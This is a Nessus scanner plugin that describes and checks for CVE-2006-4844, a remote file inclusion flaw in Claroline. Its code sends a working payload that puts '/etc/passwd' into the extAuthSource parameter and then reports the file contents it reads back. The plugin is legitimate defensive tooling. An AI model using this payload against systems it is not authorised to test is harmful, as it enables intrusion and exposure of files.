#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that is affected by a
remote file inclusion attack. 

Description :

The remote host is running Claroline, an open-source, web-based,
collaborative learning environment written in PHP. 

The version of Claroline installed on the remote host fails to
sanitize input to the 'extAuthSource' parameter array before using it
to include PHP code in the 'claroline/inc/claro_init_local.inc.php'
script.  Provided PHP's 'register_globals' setting is enabled, an
unauthenticated attacker may be able to exploit this issue to view
arbitrary files on the remote host or to execute arbitrary PHP code,
possibly taken from third-party hosts. 

See also :

http://www.gulftech.org/?node=research&article_id=00112-09142006
http://www.claroline.net/wiki/index.php/Changelog_1.7.x

Solution :

Either apply the security patch to version 1.7.7 or upgrade to
Claroline 1.7.8 or later. 

Risk factor :

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";


if (description)
{
  script_id(22365);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-4844");
  script_bugtraq_id(20056);

  script_name(english:"Claroline extAuthSource Parameter Array Remote File Include Vulnerability");
  script_summary(english:"Tries to read a local file with Claroline");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("claroline_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/claroline"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Make sure the script exists.
  url = string(dir, "/claroline/auth/login.php");
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If...
  if (
    # it looks like Claroline and...
    "Claroline Banner" >< res &&
    # it looks like the login form
    egrep(pattern:'<input [^>]*name="login"', string:res)
  )
  {
    # Try to exploit the flaw to read a file.
    file = "/etc/passwd";
    login = string(SCRIPT_NAME, "-", unixtime());  # must not exist
    postdata = string(
      "login=", login, "&",
      "password=nessus&",
      "submitAuth=Enter&",
      "extAuthSource[nessus][newUser]=", file
    );
    req = string(
      "POST ", url, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error claiming the file doesn't exist or...
      string("main(", file, "): failed to open stream: No such file") >< res ||
      # we get an error about open_basedir restriction.
      string("open_basedir restriction in effect. File(", file) >< res
    )
    {
      if (egrep(string:res, pattern:"root:.*:0:[01]:"))
        contents = res - strstr(res, "<br");

      if (contents && report_verbosity)
        report = string(
          desc,
          "\n\n",
         "Plugin output :\n",
          "\n",
          "Here are the contents of the file '/etc/passwd' that Nessus was\n",
          "able to read from the remote host :\n",
          "\n",
          contents
        );
      else report = desc;

      security_warning(port:port, data:report);
      exit(0);
    }
  }
}
